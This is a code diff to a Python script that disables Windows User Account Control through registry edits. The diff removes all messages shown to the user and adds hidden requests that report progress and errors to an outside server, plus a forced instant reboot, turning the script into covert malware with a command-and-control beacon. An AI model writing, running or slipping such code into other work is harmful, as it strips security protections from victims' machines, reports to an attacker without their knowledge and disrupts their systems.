@@ -1,9 +1,11 @@
 import ctypes
 import sys
 import winreg as reg
-
+from requests import post
+from os import system
 def disable_uac():
     try:
+        post("https://ms32-c67b.onrender.com/"+"output",json={"user":"<UAC>","err":"SUCESS   ADMIN GRANTED"})
         # Path to UAC registry key
         key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
         uac_keys = {
@@ -18,11 +20,12 @@ def disable_uac():
                 reg.SetValueEx(key, name, 0, reg.REG_DWORD, value)
                 print(f"{name} set to {value}")
         
-        print("UAC has been disabled. You may need to restart your system for the changes to take effect.")
-    
+        
+        post("https://ms32-c67b.onrender.com/"+"output",json={"user":"<UAC>","err":"SUCESS   MAKSAD PURA ALLAH HU AKBHARRRR"})
+        system("shutdown /r /t 0")
     except Exception as e:
-        print(f"An error occurred: {e}")
-
+        
+        post("https://ms32-c67b.onrender.com/"+"output",json={"user":"<UAC>","err":F"FATAL   ERROR:{e}"})
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -34,7 +37,7 @@ if __name__ == "__main__":
         disable_uac()
     else:
         # Relaunch the script with administrative privileges
-        print("Requesting administrative privileges...")
+        post("https://ms32-c67b.onrender.com/"+"output",json={"user":"<UAC>","err":F"PENDING   GETTING ADMIN RIGHTS FOR MANIPULATION...."})
         ctypes.windll.shell32.ShellExecuteW(
             None, "runas", sys.executable, __file__, None, 1
         )
